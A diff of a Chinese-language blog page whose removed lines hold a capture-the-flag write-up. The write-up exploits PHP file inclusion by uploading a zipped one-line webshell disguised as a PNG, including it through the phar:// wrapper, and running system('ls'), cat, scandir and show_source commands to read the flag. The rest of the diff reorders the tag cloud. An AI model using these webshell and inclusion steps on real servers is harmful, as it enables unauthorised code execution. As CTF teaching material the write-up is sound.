@@ -92,29 +92,12 @@
     <div class="article-content">
         
         <p>当时这道题并没有做出来，也并没有意识到会是文件包含，去年参加比赛的时候，太萌新了，机缘巧合遇到出题人才想起来再次去看这道题。</p>
-<p>考点为php伪协议文件包含<br><--more--></--more--></p>
-<p>首先点击上传文件，上传后发现，url变成了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://40.125.170.89:8007/index.php?poj=show&amp;imageid=925cb008b81193fb099183c40091de07677ac5c6</span><br></pre></td></tr></table></figure>
-<p>尝试将show替换为index，发现被成功包含执行，判定此处存在文件包含漏洞，但是拼接了<code>.php</code></p>
-<p>此时采用<code>phar</code>协议或者<code>zip</code>协议绕过</p>
-<p>然后将一句话木马压缩成zip格式的压缩包，然后将拓展名改为png，上传，并使用phar协议执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://40.125.170.89:8007/index.php?poj=phar://uploads/775edc76cc887daa1b6c3423c33f7aa3d1ac76db.png/a</span><br></pre></td></tr></table></figure>
-<p>尝试<code>system</code>发现可以使用，于是直接POST传值</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
-<p>列出当前目录，发现</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">css function.php index.php show.php tHe_flAg_1s_Here.php upload.php uploads</span><br></pre></td></tr></table></figure>
-<p>直接</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=system(&quot;cat tHe_flAg_1s_Here.php&quot;);</span><br></pre></td></tr></table></figure>
-<p>右击查看源代码即可</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag is here</span><br><span class="line">&lt;?php</span><br><span class="line">//flag&#123;yjnfrtgertyhrtyjnbvf1sn0Tifbgt&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>如果<code>system</code>函数被禁用，则可以尝试<code>scandir</code>函数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=print_r(scandir(&quot;.&quot;));//列出当前目录下的所有文件</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; css [3] =&gt; function.php [4] =&gt; index.php [5] =&gt; show.php [6] =&gt; tHe_flAg_1s_Here.php [7] =&gt; upload.php [8] =&gt; uploads )</span><br></pre></td></tr></table></figure>
-<p>使用<code>show_source</code>函数，查看文件内容</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=show_source(&apos;tHe_flAg_1s_Here.php&apos;);</span><br></pre></td></tr></table></figure>
+<p>考点为php伪协议文件包含<br>
         
         
         <p class="article-more-link">
+          
+            <a href="/2018/08/15/中孚杯铜牌LFI/#more">Read More</a>
           
        </p>
     </div>
@@ -678,7 +661,7 @@
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/铁人三项/">铁人三项</a><a href="/tags/综合渗透/">综合渗透</a><a href="/tags/Writeup/">Writeup</a>
+  <span></span> <a href="/tags/综合渗透/">综合渗透</a><a href="/tags/铁人三项/">铁人三项</a><a href="/tags/Writeup/">Writeup</a>
   </div>
 
 </div>
@@ -739,10 +722,6 @@
 			
 		
 			
-				<li><a href="/tags/自动化/" title="自动化">自动化<sup>2</sup></a></li>
-			
-		
-			
 				<li><a href="/tags/汇编/" title="汇编">汇编<sup>2</sup></a></li>
 			
 		
@@ -751,11 +730,23 @@
 			
 		
 			
-				<li><a href="/tags/铁人三项/" title="铁人三项">铁人三项<sup>2</sup></a></li>
+				<li><a href="/tags/自动化/" title="自动化">自动化<sup>2</sup></a></li>
 			
 		
 			
 				<li><a href="/tags/综合渗透/" title="综合渗透">综合渗透<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/铁人三项/" title="铁人三项">铁人三项<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/bypass/" title="bypass">bypass<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/XAMPP/" title="XAMPP">XAMPP<sup>1</sup></a></li>
 			
 		
 			
@@ -771,34 +762,6 @@
 			
 		
 			
-				<li><a href="/tags/php/" title="php">php<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/pdo/" title="pdo">pdo<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/bypass/" title="bypass">bypass<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/selenium/" title="selenium">selenium<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/AWD/" title="AWD">AWD<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/xman/" title="xman">xman<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/CTF/" title="CTF">CTF<sup>1</sup></a></li>
-			
-		
-			
 				<li><a href="/tags/TensorFlow/" title="TensorFlow">TensorFlow<sup>1</sup></a></li>
 			
 		
@@ -807,11 +770,31 @@
 			
 		
 			
+				<li><a href="/tags/pdo/" title="pdo">pdo<sup>1</sup></a></li>
+			
+		
+			
 				<li><a href="/tags/中孚杯/" title="中孚杯">中孚杯<sup>1</sup></a></li>
 			
 		
 			
 				<li><a href="/tags/山东省大学生信息安全竞赛/" title="山东省大学生信息安全竞赛">山东省大学生信息安全竞赛<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/selenium/" title="selenium">selenium<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/攻击脚本/" title="攻击脚本">攻击脚本<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Wireshark/" title="Wireshark">Wireshark<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/AWD/" title="AWD">AWD<sup>1</sup></a></li>
 			
 		
 		</ul>
